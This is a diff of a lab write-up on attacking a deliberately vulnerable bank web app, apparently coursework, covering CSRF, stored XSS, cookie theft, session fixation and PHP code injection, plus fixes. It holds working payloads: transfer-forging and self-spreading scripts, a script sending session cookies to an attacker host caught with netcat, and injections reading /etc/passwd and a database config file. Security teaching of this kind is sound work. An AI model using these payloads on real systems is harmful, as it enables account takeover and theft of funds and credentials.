@@ -3,19 +3,19 @@ Web Application Vulnerabilities -2
 ### Exercise 1: Cross Site Request Forgery (CSRF/XSRF)
 
 #### Task 1
-__Q__ 1. Briefly explain what CSRF/XSRF is in your own words (outline the roles and steps involved in XSRF attack).
+__Q: Briefly explain what CSRF/XSRF is in your own words (outline the roles and steps involved in XSRF attack).__
 
 __Solution__
 
 - Cross-site-request-forgery (CSRF)- is an attack where a malicious website exploits trust between the web browser and the authenticated user's website that is vulnerable.
-- Unauthorized requests or commands are run on behalf of the victim on a vulnerable website.
+- Unauthorized requests or commands are executed on behalf of the victim on a vulnerable website.
 -  Assume a vulnerable website that allows executing commands (like funds transfer) containing a URL for that fund's transfer. So when the user hits `transfer funds` with appropriate parameters, the request gets executed successfully.
 
 - Steps involved:
     - Setup a malicious website.
-    - craft a script or source (like, `img` tags, `iframe`) that executes a request to transfer funds.
-    - Allow the  authenticated victim to access the malicious website.
-    - Send the fund transfer request. (Since the victim is authenticated and the URL/script is crafted to transfer funds, cookies stored on the victim's browser also be sent).
+    - Craft a script or source (like, `img` tags, `iframe`) that executes a request to transfer funds.
+    - Allow the authenticated victim to access the malicious website.
+    - Send the fund transfer request (Since the victim is authenticated and the URL/Script is crafted to transfer funds, cookies stored on the victim's browser also be sent).
     - Request is sent on behalf of malicious users so the request is executed successfully.
 
 
@@ -34,7 +34,7 @@ __Solution:__ After examining the web request from the `Transfer Funds` page, th
 
 #### Task 4
 
-__Assume that you are a valid customer of your bank. Show how you can use XSRF
+__Q: Assume that you are a valid customer of your bank. Show how you can use XSRF
 to transfer money from another account to your account.__
 __Solution:__ In this attack, XSS vulnerability on the Account Details page is leveraged to perform CSRF.
 Follow the tutorial to install Nginx
@@ -75,26 +75,33 @@ Three payloads were used due to the character limitations of the remark field.
 Go to Transfer Funds page and send the below three payloads in remark field to victim account from the attacker account.
 
 Payload 1
-```script
+```javascript
     <script>var x = document.getElementsByName("account")[0].value</script> 
 ```
 Payload 2 
-```script
+```javascript
     <script>function y(){window.open("http://localhost:81/error.html?x="+x, "_blank");}</script> 
 ```
-Payload3
-```script
+Payload 3
+```javascript
     <a onclick="y()">Error please click here!!</a>
 ```
 Once the payloads are transferred victim can see a ``` Error please click here!!!``` link in the remark field on the Account details page.
 Assuming the victim is innocent and clicks the link.
+
+![Error_Link](images/task2/1.4.png)
+
 The page will be redirected to the error.html which is up and running in the attacker server (Nginx).
+
+![Attacker_Website](images/task2/1.4.1.JPG)
 
 If the victim clicks on the 'proceed' button, the funds will be transferred to the attacker's account, and the page is redirected to the bank web application.
 
+![Attack_Successful](images/task2/1.4.2.JPG)
+
 
 #### Task 5.
-__5. Enhance your last attack such that it automatically spreads to other accounts and transfers your money from them too. Briefly explain your attack.__
+__Q: Enhance your last attack such that it automatically spreads to other accounts and transfers your money from them too. Briefly explain your attack.__
 
 To perform this attack we have to make some assumptions to overcome some limitations,
 The assumption is that a bank account number is an eight-digit number with the same number in every digit place like 11111111,22222222,33333333....,99999999.
@@ -109,53 +116,53 @@ Because of these limitations for the demonstration of the attack, we made the as
 To perfom the attack please repeat the process explained in excercise 1.d replacing the cookie.html code with the code given below.
 
 ```
-<html>
-<body >
-We are very sorry for the inconvenience, you had an error while during the last transaction, please click the button bellow to claim your refund plus 1 cent gift.
-<button onclick="getURL()"> Proceed </button>
-<div style="display:none" id="images"> </div>
-</body>
+	<html>
+	<body >
+	We are very sorry for the inconvenience, you had an error while during the last transaction, please click the button bellow to claim your refund plus 1 cent gift.
+	<button onclick="getURL()"> Proceed </button>
+	<div style="display:none" id="images"> </div>
+	</body>
 
-<script>
-const queryString = window.location.search;
-console.log(queryString);
-const urlParams = new URLSearchParams(queryString);
-const accountNo = urlParams.get('x');
-console.log(accountNo);
+	<script>
+	const queryString = window.location.search;
+	console.log(queryString);
+	const urlParams = new URLSearchParams(queryString);
+	const accountNo = urlParams.get('x');
+	console.log(accountNo);
 
-const allAccounts = [11111111,22222222,33333333,44444444,55555555,66666666,77777777,88888888,99999999];
+	const allAccounts = [11111111,22222222,33333333,44444444,55555555,66666666,77777777,88888888,99999999];
 
-function getURL()
-{
+	function getURL()
+	{
 
-allAccounts.forEach(function(destAccount){
-	var varName = new Image();
-	varName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.1&remark=%3Cscript%3Evar+x+%3D+document.getElementsByName%28%22account%22%29%5B0%5D.value%3C%2Fscript%3E&htbtransfer=Transfer";
-	document.getElementById('images').appendChild(varName);
-	
-	var funcName = new Image();
-	funcName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.2&remark=%3Cscript%3Efunction+y%28%29%7Bwindow.open%28%22http%3A%2F%2Flocalhost%2Fhtdocs%2Ferror.html%3Fx%3D%22%2Bx%2C+%22_blank%22%29%3B%7D%3C%2Fscript%3E&htbtransfer=Transfer";
-	document.getElementById('images').appendChild(funcName);
-	
-	var executeFunction = new Image();
-	executeFunction.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.3&remark=%3Ca+onclick%3D%22y%28%29%22%3EError+please+click+here%21%21%3C%2Fa%3E++&htbtransfer=Transfer";
-	document.getElementById('images').appendChild(executeFunction);
+	allAccounts.forEach(function(destAccount){
+		if(destAccount!= accountNo){
+			var varName = new Image();
+			varName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.1&remark=%3Cscript%3Evar+x+%3D+document.getElementsByName%28%22account%22%29%5B0%5D.value%3C%2Fscript%3E&htbtransfer=Transfer";
+			document.getElementById('images').appendChild(varName);
 
-		
-	});
+			var funcName = new Image();
+			funcName.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.2&remark=%3Cscript%3Efunction+y%28%29%7Bwindow.open%28%22http%3A%2F%2Flocalhost%2Fhtdocs%2Ferror.html%3Fx%3D%22%2Bx%2C+%22_blank%22%29%3B%7D%3C%2Fscript%3E&htbtransfer=Transfer";
+			document.getElementById('images').appendChild(funcName);
 
-const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc=14314312&amount=1.95&remark=&htbtransfer=Transfer";
+			var executeFunction = new Image();
+			executeFunction.src = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc="+destAccount+"&amount=1.3&remark=%3Ca+onclick%3D%22y%28%29%22%3EError+please+click+here%21%21%3C%2Fa%3E++&htbtransfer=Transfer";
+			document.getElementById('images').appendChild(executeFunction);
 
-window.open(url, "_blank");
+		}	
+		});
 
-}
+	const url = "http://localhost/htdocs/index.php?page=htbtransfer&srcacc="+accountNo+"&dstbank=41131337&dstacc=14314312&amount=1.95&remark=&htbtransfer=Transfer";
 
-</script>
+	window.open(url, "_blank");
 
-</html>
+	}
+	</script>
+	</html>
 ```
 when the victim clicks the ``` Error please click here!!!``` link the attack will spread to all accounts on the bank server.
 
+![Automated_Attack](images/task2/1.5.JPG)
 <br></br>
 <hr></hr>
 <br></br>
@@ -327,79 +334,65 @@ After installation, start the Nginx server using
 Creat a file cookie.html in your Nginx server folder with the code
 
 ``` 
-<html>
-<body>
-<script>
-const queryString = window.location.search;
-console.log(queryString);
-const urlParams = new URLSearchParams(queryString);
-const cookie = urlParams.get('c');
-const Http = new XMLHttpRequest();
-// Give your Ip machine Ip address where the server is running
-var sendCookie='http://192.168.59.139:82/'+cookie; 
-Http.open("GET", sendCookie);
-Http.send();
+	<html>
+	<body>
+	<script>
+	const queryString = window.location.search;
+	console.log(queryString);
+	const urlParams = new URLSearchParams(queryString);
+	const cookie = urlParams.get('c');
+	const Http = new XMLHttpRequest();
+	// Give your Ip machine Ip address where the server is running
+	var sendCookie='http://192.168.59.139:82/'+cookie; 
+	Http.open("GET", sendCookie);
+	Http.send();
 
-</script>
-							
-<html>
-<body>
+	</script>
 
-</body>
-</html>
+	<html>
+	<body>
+
+	</body>
+	</html>
 
 ```
-send the following payload to victim using XSS (Transfer)
-
-
-
+send the following payload to victim using XSS (Transfer).
+```javascript 
+<script>new Image().src="http://localhost:81/cookie.html?c="+document.cookie;</script>
+```
+Start a Netcat server to listen the Requests on port 82 (port used in script)
+```bash 
+	sudo nc -l -p 82 -v -n
+```
 - The request for the above script can be seen in attacker's server logs
     ```bash
-        └─$ python3 -m http.server
-            Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-            192.168.37.128 - - [08/May/2021 09:05:16] "GET / HTTP/1.1" 200 -
-            192.168.37.128 - - [08/May/2021 09:05:16] code 404, message File not found
-            192.168.37.128 - - [08/May/2021 09:05:16] "GET /USECURITYID=v155sm5645ckoddmdpepcubbc4 HTTP/1.1" 404 -
+    	sudo nc -l -p 82 -v -n
+	listening on [any] 82 ...
+	connect to [192.168.59.139] from (UNKNOWN) [192.168.59.139] 60698
+	GET /cookie.html?c=USECURITYID=b35oqi84j4l16mecckl4lksf60 HTTP/1.1
+	Host: 192.168.59.139:82
+	User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+	Accept: image/webp,*/*
+	Accept-Language: en-US,en;q=0.5
+	Accept-Encoding: gzip, deflate
+	Connection: keep-alive
+	Referer: http://localhost/htdocs/index.php?page=htbdetails&account=173105291
     ```
-- From the logs we can observe the request contents `USECURITYID=v155sm5645ckoddmdpepcubbc4` which we know that , is a cookie value.
+- From the logs we can observe the request contents `USECURITYID=b35oqi84j4l16mecckl4lksf60` which we know that , is a cookie value.
 
-
-__Solution 2:__
-
-- We already have apache2 server running on port 80 
-- Run Netcat server with port 81 using command 
-  ``` sudo nc -l -p 81 -v -n````
-- Transfer amount from attacker account to victim account with the below payload as remark
-  ```javascript 
-    <script> new Image().src="http://192.168.59.139:82/cookie.html?c="+document.cookie;</script>
-  ```
-- When victim open the account details page the netcat server gets the cookie:
-  ```sudo nc -l -p 82 -v -n
-     [sudo] password for kakashi: 
-     listening on [any] 82 ...
-     connect to [192.168.59.139] from (UNKNOWN) [192.168.59.139] 34582
-     GET /cookie.html?c=USECURITYID=esl5thgedb8lt2t63pv4jg5v10 HTTP/1.1
-     Host: 192.168.59.139:82
-     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
-     Accept: image/webp,*/*
-     Accept-Language: en-US,en;q=0.5
-     Accept-Encoding: gzip, deflate
-     Connection: keep-alive
-     Referer: http://localhost/htdocs/index.php?page=htbdetails&account=184830489    ```
-From the logs we can observe the cookie value that is esl5thgedb8lt2t63pv4jg5v10
 
 
 __2. Use the implementation from the last step to hijack the session of a customer of your bank. Briefly describe the steps to perform this attack.__
 __solution:__
 
-- Copy the `USECURITYID=v155sm5645ckoddmdpepcubbc4` that is captured on the server log
+- Copy the `USECURITYID=b35oqi84j4l16mecckl4lksf60` that is captured on the server log
 - Install `EditThisCookie` extension from chrome https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg/related?hl=en
-- Open the login page of the application in private window 
+- Open the login page of the application in a private window 
 - Past the cookie  value, into the `Value` field.
 ![edit_this_cookie](images/task2/edit_this_cookie.PNG)
 - Click on Green tick below the window
 - Reload the page
-- Should be logged in as user
+- Should be logged in as a user
 - **Result**
 
 
@@ -409,32 +402,60 @@ __solution:__
 __3. Which possible implementation mistakes enable your attack?__
 __Solution :__
 1. Application is vulnerable to XSS(unsanitized user input at `Remarks` field), thus leveraging it to steal cookies.
-2. Cross domain requests are possible(allowing it to send request to attacker's site), no `Same-Origin-Policy` is implemented.
-3. No `HttpOnly` flag, as this tells the browser not to display access cookies through client side scripts
+2. Cross-domain requests are possible(allowing it to send arequest to the attacker's site), no `Same-Origin-Policy` is implemented.
+3. No `HttpOnly` flag, as this tells the browser not to display access cookies through client-side scripts.
 
 
 __4. How would https influence it?__
-__Solution:__ `https` has no significant influence in this case, as the attacker can still access the cookie(as it is stored un-encrypted) and send it over to attacker's server. However this would be beneficial if the attacker is in same network as user and  try to steal cookies,as  the data is sent encrypted. 
-> If cookies are sent in headers `secure` flag should be set, to indicate the browser that cookie can only be sent in `https` requests.
+__Solution:__ `HTTPS` has no significant influence in this case, as the attacker can still access the cookie (as it is stored un-encrypted) and send it over to the attacker's server. However, this would be beneficial if the attacker is in the same network as the user and try to steal cookies, as the data is sent encrypted. 
+ If cookies are sent in headers `secure` flag should be set, indicate to the browser that cookies can only be sent in `HTTPS` requests.
 
 __5. Implement some precautions which can prevent or mitigate this attack?__
 __Solution:__
-1. Sanitize user input to avaoiud any injection into the application.
-2. set `Http Only` flag to true in both index.pho and login.php to avoid cookies being accessed by client side scripts
-```session_set_cookie_params($htbconf['bank/cookievalidity'],,null,null,null,true);```
+1. Sanitize user input to avoid any injection into the application.
+2. set `Http Only` flag to true in both index.php and login.php to avoid cookies being accessed by client side scripts
+```session_set_cookie_params($htbconf['bank/cookievalidity'],null,null,null,true);```
 
+![Cookie_Hijaking_Fix](images/task2/4.5.JPG)
 ### Exercise 5: Session Fixation
 
 __1. Explain the difference to Session Hijacking.__
-__Solution :__ In Session Fixation, the attacker forces the user to use the session of his choice, where in   Session Hijacking , the logged in user session is hijacked.
+__Solution :__ In Session Fixation, the attacker forces the user to use the session of his choice, wherein  Session Hijacking, the logged-in user session is hijacked.
 
 __2. Sketch an attack that allows you to take over the session of a bank user.__
 __Solution :__
 - Found two approches in hijacking a session using session fixation.
-1. Manual way, setting the broswer cookie to dewsired value with key being `USECURITYID` (assuming that attacker has physical access to victim's browser)
-2. Stored XSS(on `Funds Transfer` page) attack to set the cookie value.
-
+1. This approch leverages the phishing attack. A victim is provided with a link and assumption is that he clicks the link.
+2. Manual way, setting the broswer cookie to dewsired value with key being `USECURITYID` (assuming that attacker has physical access to victim's browser)
 **Approach 1**
+- create a html file in your server folder with the following script
+	```html
+		<html>
+		<script>
+		function getURL(){
+		document.cookie="USECURITYID=abcde";
+
+		window.open("http://localhost/htdocs/index.php?", "_blank");
+		}
+		</script>
+		  <head>
+
+		  </head>
+		  <body>
+			<h1> Congo bro you are not gonna get hacked!! :D </h1>
+		   <button onclick="getURL()"> Login </button>
+		  </body>
+		</html>	
+	```
+
+- User is provided with the link  ```http://localhost:81/bank.html``` which will redired to bank web application.
+ ![Attacker_Website](images/task2/5.1.JPGJPG)
+- when user get redirect the cookie value will be set to ```abcde```.
+ ![Session_Fixation](images/task2/5.1.1.JPG)
+- Follow the same steps provided in Exercise 4 task 2 with a cookie value as ```abcde``. 
+- Attacker can login into victim account.
+  
+**Approach 2**
 - **step 1**: Open `EditThiCookie` extension and click on import.
 - **step 2:** Use the following payload to set the cookie value
 ```javascript
@@ -466,7 +487,7 @@ __Solution :__
 ![fixation_after_login](images/task2/fixation_after_login.png)
 
 
- - **step 3**: In another browser use the same cookie values to import it to `EditThisCookie` extension
+- **step 3**: In another browser use the same cookie values to import it to `EditThisCookie` extension
 - **step 4** Reload the page.
 
  **Result** : Session successfully hijacked using the fixed cookie value
@@ -475,35 +496,15 @@ __Solution :__
 
  ![hijack_after_fixation](images/task2/hijack_after_fixation.PNG)
 
-
- **Approach 2**
-- Using stored XSS to set the cookie
-    - **step 1** Initiate funds transfer to the victim
-    - **step 2** use the following payload in `remarks` field and click on transfer
-        ```javascript
-        <script>document.cookie="USECURITYID=abcde";<script>
-        ```
-    ![set_cookie_in_remarks](images/task2/set_cookie_in_remarks.PNG)
-    - **step 3** allow the Victim to login and view `My Accounts`. (Opening the victim account in another browser and click on `Account Details`)
-    ![fixation_using_xss](images/task2/fixation_using_xss.PNG)
-    - We can observe that `USECURITYID` is set twice, one after user login and another using xss.
-    - As attacker without useing the log in functionality. Insert the cookie value into the browser(use `EditThisCookie` extension to import the key, value or simply add the `Name`, `value`, `Domain` fields in `Developer Tools` => `Application`,as seen in the figure.)
-    - **step 4** Reload the page. and account should be logged in as Victim. Thus hiacking a logged in user session with fixed `cookie value`
-
-**[Attacker's browser after editing the cookie value to `abcde` and reloading.]**
-
-![attacker_machine_after_fixation](images/task2/attacker_machine_after_fixation.PNG)
-
-
-another approach
+Another approach
 - setting the cookie value using HTTP header response by intercepting the traffic between web server and client's browser.
 
 __3. How can you generally verify that an application is vulnerable to this type of attack?__
 __solution:__
-- Set the cookie value to random string(usually similar length or format as actual cookie value) before  logging in to the application.
+- Set the cookie value to random string(usually similar length or format as actual cookie value) before logging in to the application.
 - Now login to the application.
 - Observe the cookie value set  after login by the application in developer tools => storage.
-- If the cookie value is same as set before login and no new cookie name,values or parameters are added and the account is still logged in, then we can confirm that application is vulnerable to session fixation attack.
+- If the cookie value is same as set before login and no new cookie name, values or parameters are added and the account is still logged in, then we can confirm that application is vulnerable to session fixation attack.
 
 
 
@@ -515,7 +516,13 @@ __5. Accordingly, which countermeasure is necessary to prevent your attacks?
 Patch your system and test it against Session Fixation again.__
 
 <!-- NOTE   finish -->
-__Solution__ session_rengenerate()
+__Solution__ Everytime a session has been started  regenerate the session id.
+
+```php
+	session_start();
+	session_regenerate_id(TRUE); 
+	$_SESSION=array(); // initializing a empty array values the session variable.
+```
 
 
 
@@ -558,9 +565,15 @@ $replaceWith =''.phpinfo().'';  //without markup
 
 
 __2. Disclose the master password for the database your bank application has access to. Indicate username, password and DB name as well as the IP address of the machine this database is running on.__
+__solution__ try to look at the folder structure using 
+``` '. system("ls"); .' ``` and ``` '. system("cd .."); .' ``` 	
+
+Once we know the location of config.php file use the path in cat command ``` '. system("cat ../etc/config.php"); .' ```	 to display the file contents of ```config.php```
+
+![database_Details](images/task2/6_2.JPG)
+__3. Explain how you can display the php settings of your webserver! Which
+information is relevant for the attacker?
 __solution__
-
-
 
 
 __4. Assume you are running a server with virtual hosts. Can you disclose the password for another bank database and can you access it? Explain which potential risk does this vulnerability imply for virtual hosts?__
@@ -581,7 +594,7 @@ __solution__
 
 - payload used:
     ```php
-        '. system("cat/etc/passwd") .'
+        '. system("cat /etc/passwd") .'
     ```
 - Result:
 
